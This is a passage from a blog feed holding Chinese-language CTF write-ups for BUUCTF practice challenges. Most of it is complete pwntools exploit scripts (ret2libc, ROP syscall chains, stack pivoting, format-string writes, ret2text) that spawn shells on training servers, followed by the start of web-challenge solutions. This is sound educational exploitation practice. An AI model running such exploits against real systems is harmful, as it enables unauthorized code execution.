class="number">50</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x17-pwn2-sctf-2016"><a href="#0x17-pwn2-sctf-2016" class="headerlink" title="0x17.pwn2_sctf_2016"></a>0x17.pwn2_sctf_2016</h2><p>get_n函数的第二个参数是unsigned int，可以整数溢出。</p><p>接收了两次you said，第一次是程序本身，第二次是自己的format。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25915</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn2_sctf_2016&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0804852F</span></span><br><span class="line">fmt_addr = <span class="number">0x080486F8</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt) +p32(vuln_addr)+p32(fmt_addr)+p32(printf_got)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;You said: &quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;You said: &quot;</span>)</span><br><span class="line">printf_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>) + p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x18-ciscn-2019-s-3"><a href="#0x18-ciscn-2019-s-3" class="headerlink" title="0x18.ciscn_2019_s_3"></a>0x18.ciscn_2019_s_3</h2><p>　　32位与64位 系统调用的区别：</p><blockquote><ol><li><p>传参方式不同</p></li><li><p>系统调用号 不同</p></li><li><p>调用方式 不同</p></li></ol></blockquote><p>　　32位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</span><br><span class="line"></span><br><span class="line">调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</span><br><span class="line"></span><br><span class="line">调用方式: 使用 int 80h 中断进行系统调用</span><br></pre></td></tr></table></figure><p>　　64位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</span><br><span class="line"></span><br><span class="line">调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1</span><br><span class="line"></span><br><span class="line">stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15</span><br><span class="line"></span><br><span class="line">调用方式: 使用 syscall 进行系统调用</span><br></pre></td></tr></table></figure><p>调用：$rax==59，$rdi==“/bin/sh”，$rsi==0，$rdx==0</p><p>首先往栈上写0x400，然后从栈上读0x30</p><p>经过调试发现输入后返回的是写入栈上的位置。</p><p><img src="/2021/06/01/BUU-PWN-0x10-0x1F/../../Note/PWN/BUU_PWN%E5%88%B7%E9%A2%98/0x10-0x1F.assets/image-20210511160829045.png" alt="image-20210511160829045"></p><p>将0x00007ffe7d621e58减去0x00007ffe7d621d40得到0x118（固定）</p><p>所以经过recv的地址减去0x118就是写入/bin/sh的地址</p><p>有个gadgets函数：</p><p><img src="/2021/06/01/BUU-PWN-0x10-0x1F/image-20210511161319133.png" alt="image-20210511161319133"></p><p>其中的0x3B就是59，系统调用，</p><blockquote><p>hex(0x00007ffe7d621e58 - 0x7ffe7d621d40)<br>‘0x118’</p></blockquote><p><img src="/2021/06/01/BUU-PWN-0x10-0x1F/image-20210511162201775.png" alt="image-20210511162201775"></p><p>r12是将要执行的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26613</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_s_3&quot;)</span></span><br><span class="line">vulun_addr = <span class="number">0x4004ED</span></span><br><span class="line">mov_rax = <span class="number">0x4004E2</span></span><br><span class="line">pop_rbx_rbp_r12= <span class="number">0x40059a</span></span><br><span class="line">mov_call = <span class="number">0x400580</span></span><br><span class="line">sys_call = <span class="number">0x400517</span></span><br><span class="line">pop_rdi = <span class="number">0x04005a3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(vulun_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_add = u64(io.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(pop_rbx_rbp_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+ p64(bin_sh_add+<span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload +=  p64(mov_call)+p64(mov_rax) +p64(pop_rdi)+ p64(bin_sh_add) + p64(sys_call)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x19-HarekazeCTF2019-baby-rop2"><a href="#0x19-HarekazeCTF2019-baby-rop2" class="headerlink" title="0x19.[HarekazeCTF2019]baby_rop2"></a>0x19.[HarekazeCTF2019]baby_rop2</h2><p>printf泄露地址，ROP构造system /bin/sh。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./babyrop2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26898</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babyrop2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">fmt_str = <span class="number">0x00400770</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400733</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400731</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret)+ p64(fmt_str) +p64(pop_rsi_r15_ret) </span><br><span class="line">payload +=  p64(read_got)+p64(<span class="number">0</span>) + p64(printf_plt)+ p64(main) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;again, &quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;again, &quot;</span>)</span><br><span class="line">read_add  = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_add ) </span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;read&#x27;,read_add)</span></span><br><span class="line">base = read_add - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> +p64(pop_rdi_ret)+ p64(bin_sh) + p64(system_add)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1A-jarvisoj-fm"><a href="#0x1A-jarvisoj-fm" class="headerlink" title="0x1A.jarvisoj_fm"></a>0x1A.jarvisoj_fm</h2><p>格式化字符串。是第11个。</p><p>p32(x_addr) + “%11$n” 意思是将x_addr写入11的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./fm&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26157</span>)</span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1B-jarvisoj-tell-me-something"><a href="#0x1B-jarvisoj-tell-me-something" class="headerlink" title="0x1B.jarvisoj_tell_me_something"></a>0x1B.jarvisoj_tell_me_something</h2><p>简单的ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./guestbook&quot;</span>)</span><br><span class="line">fun_add = <span class="number">0x400620</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+ p64(fun_add)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1C-jarvisoj-level4"><a href="#0x1C-jarvisoj-level4" class="headerlink" title="0x1C.jarvisoj_level4"></a>0x1C.jarvisoj_level4</h2><p>ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">write_plt = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+ p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>)+p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_add = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> write_add</span><br><span class="line"></span><br><span class="line">base = write_add - write_got</span><br><span class="line">sys_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys_add)+ p32(main_addr)+ p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1D-jarvisoj-level3"><a href="#0x1D-jarvisoj-level3" class="headerlink" title="0x1D.jarvisoj_level3"></a>0x1D.jarvisoj_level3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28043</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">write_plt = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">fun_add = <span class="number">0x0804844B</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> +<span class="string">&#x27;bbbb&#x27;</span> + p32(write_plt) + p32(fun_add) + p32(<span class="number">1</span>)+ p32(write_got)  + p32(<span class="number">4</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_add = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_add)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">base = write_add - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> +<span class="string">&#x27;bbbb&#x27;</span> + p32(sys_add) +p32(<span class="number">0x10086110</span>) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1E-Black-Watch-入群题-PWN"><a href="#0x1E-Black-Watch-入群题-PWN" class="headerlink" title="0x1E.[Black Watch 入群题]PWN"></a>0x1E.[Black Watch 入群题]PWN</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vul_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中s在bss段。</p><p>在read buf的位置正好可以覆盖返回地址，覆盖为s的地址，然后在s的地方写入构造好的payload。</p><p>s处：</p><blockquote><p>  p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)</p></blockquote><p>s：<code>0804A300</code></p><p>先说下buf处payload的构造：<code>p32(0x18*&#39;a&#39;) + p32(s_addr-4)+ p32(leave_ret)</code></p><p>ebp指向save_rbp的位置，也就是填入p32(s_addr_4)的位置。然后将返回地址写为leave_ret 的地址。</p><p>首先，执行leave_ret(也就是mov rsp,rbp;pop rbp)，会将rsp和rbp通同时指向save_rbp的位置，然后pop rbp，将rbp指向bss段的s_addr-4的位置；再之后rsp再次进行leave_ret，执行完后这时rsp指向bss段s_addr-4的位置，rbp指向s_addr的位置。（pop rbp会将rbp+4）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./spwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29713</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./spwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">write_plt = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line">s_addr = <span class="number">0x0804A300</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = p32(write_plt) + p32(main) + p32(<span class="number">1</span>)+p32(write_got)+ p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">payload1 = <span class="number">0x18</span>*<span class="string">&#x27;a&#x27;</span>+p32(s_addr-<span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">base = write_addr - write_got</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = p32(sys_addr) + p32(main) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1F-bjdctf-2020-babystack2"><a href="#0x1F-bjdctf-2020-babystack2" class="headerlink" title="0x1F.bjdctf_2020_babystack2"></a>0x1F.bjdctf_2020_babystack2</h2><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./bjdctf_2020_babystack2&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x00400726</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;0x10-HarekazeCTF2019-baby-rop&quot;&gt;&lt;a href=&quot;#0x10-HarekazeCTF2019-baby-rop&quot; class=&quot;headerlink&quot; title=&quot;0x10.[HarekazeCTF2019</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_WEB刷题_0x10-0x1F</title>
    <link href="http://example.com/2021/05/03/BUU-WEB-0x10-0x1F/"/>
    <id>http://example.com/2021/05/03/BUU-WEB-0x10-0x1F/</id>
    <published>2021-05-02T16:00:00.000Z</published>
    <updated>2021-06-02T02:12:41.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x10-ACTF2020-新生赛-Upload"><a href="#0x10-ACTF2020-新生赛-Upload" class="headerlink" title="0x10.[ACTF2020 新生赛]Upload"></a>0x10.[ACTF2020 新生赛]Upload</h2><p>和之前的一个一样，改个后缀名就OK。</p><p><img src="/2021/05/03/BUU-WEB-0x10-0x1F/image-20210417185844946.png" alt="image-20210417185844946"></p><h2 id="0x11-ACTF2020-新生赛-BackupFile"><a href="#0x11-ACTF2020-新生赛-BackupFile" class="headerlink" title="0x11.[ACTF2020 新生赛]BackupFile"></a>0x11.[ACTF2020 新生赛]BackupFile</h2><p>可以简单扫下，发现index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>str弱相等，被转化为整形</p><p>传参key=123得到flag</p><h2 id="0x12-HCTF-2018-admin"><a href="#0x12-HCTF-2018-admin" class="headerlink" title="0x12.[HCTF 2018]admin"></a>0x12.[HCTF 2018]admin</h2><p>Unicode欺骗：</p><p>具体编码可查：<a href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a> </p><p>ᴬᴰᴹᴵᴺ</p><h2 id="0x13-极客大挑战-2019-BuyFlag"><a href="#0x13-极客大挑战-2019-BuyFlag" class="headerlink" title="0x13.[极客大挑战 2019]BuyFlag"></a>0x13.[极客大挑战 2019]BuyFlag</h2><p>pay的页面中有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 